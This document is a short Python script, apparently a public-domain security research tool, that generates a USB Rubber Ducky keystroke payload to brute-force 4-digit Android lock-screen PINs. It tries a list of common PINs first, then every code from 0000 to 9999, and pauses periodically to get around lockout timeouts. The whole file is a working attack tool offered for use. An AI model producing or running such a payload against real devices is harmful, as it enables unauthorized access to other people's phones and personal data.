#!/usr/bin/env python
# rduck-pinbrute: Generate Duckyscript file that brute forces all 4-digit
# PIN values for use in attacking Android devices.  Prioritizes common
# PIN values before resorting to exhaustive 0000-9999 search.
# Joshua Wright, josh@willhackforsushi.com. Public Domain.
#
# Inspired by Darren Kitchen script: 
# https://forums.hak5.org/index.php?/topic/28165-payload-android-brute-force-4-digit-pin/

# Data Genetics high probability list
# http://www.datagenetics.com/blog/september32012/
dglist = {"1234", "1111", "0000", "1212", "7777", "1004", "2000", 
      "4444", "2222", "6969", "9999", "3333", "5555", "6666", 
      "1122", "1313", "8888", "4321", "2001", "1010"}

# Initial delay to allow keyboard to be recognized as USB device
print "DELAY 5000"

pcount=0
for pin in dglist:
    print "STRING " + pin
    print "DELAY 1000"
    print "ENTER\nENTER"

    pcount+=1
    if (pcount%5) == 0:
        print "DELAY 30000"
        print "ENTER\nENTER"

# Continue building list, brute-force
for i in range(0,10000):
    pin='{:04d}'.format(i)
    if pin in dglist:
        continue
    print "STRING " + pin
    print "DELAY 1000"
    print "ENTER\nENTER"
    
    pcount+=1
    if (pcount%5) == 0:
        print "DELAY 30000"
        print "ENTER\nENTER"
